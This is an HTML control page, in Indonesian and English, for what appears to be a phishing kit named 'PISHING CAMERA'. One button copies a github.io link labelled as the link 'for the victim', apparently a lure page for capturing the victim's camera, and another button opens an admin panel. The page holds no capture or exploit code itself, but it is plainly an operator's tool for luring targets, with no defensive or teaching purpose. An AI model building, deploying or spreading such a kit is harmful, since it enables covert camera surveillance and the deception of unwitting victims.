<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>REALTEAM PISHING</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
      text-align: center;
    }

    h1 {
      font-size: 2.5rem;
      margin-bottom: 30px;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
    }

    .btn {
      padding: 15px 30px;
      margin: 10px;
      font-size: 1rem;
      border: none;
      border-radius: 12px;
      background: #00c6ff;
      background: linear-gradient(to right, #0072ff, #00c6ff);
      color: white;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(0, 198, 255, 0.4);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }

    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 198, 255, 0.6);
    }

    .copy-status {
      margin-top: 10px;
      font-size: 0.9rem;
      color: #90ee90;
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .copy-status.show {
      opacity: 1;
    }
  </style>
</head>
<body>

  <h3>PISHING CAMERA</h3>

  <button class="btn" onclick="copyLink()">Copy Link Untuk Korban</button>
  <button class="btn" onclick="goToPage()">Panel admin</button>

  <div class="copy-status" id="copyStatus">Link copied!</div>

  <script>
    function copyLink() {
      const dummy = document.createElement("input");
      const link = "https://traserofficial.github.io/officialtraser/p2.html";
      document.body.appendChild(dummy);
      dummy.value = link;
      dummy.select();
      document.execCommand("copy");
      document.body.removeChild(dummy);

      const status = document.getElementById("copyStatus");
      status.classList.add("show");
      setTimeout(() => status.classList.remove("show"), 2000);
    }

    function goToPage() {
      window.location.href = "a1.html";
    }
  </script>

</body>
</html>
